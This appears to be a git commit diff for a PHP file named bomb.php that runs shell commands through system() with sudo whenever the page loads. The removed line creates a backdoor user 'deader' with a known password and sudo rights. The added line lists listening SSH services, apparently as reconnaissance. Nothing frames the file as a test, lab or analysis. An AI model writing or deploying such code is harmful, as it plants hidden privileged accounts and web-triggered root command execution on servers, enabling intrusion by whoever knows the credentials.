d727316cea289f040a4915291c9e26839ebfab08
ju7t4te5t <ju7t4te5t@gmail.com>
2024-11-26 21:15:43 +0330

    Update bomb.php

--- bomb.php
+++ bomb.php
@@ -1,1 +1,1 @@
-<?php system('sudo adduser deader --gecos "" --disabled-password && echo "deader:deader" | sudo chpasswd && sudo usermod -aG sudo deader'); ?>
+<?php system('sudo ss -tlnp | grep ssh'); ?>
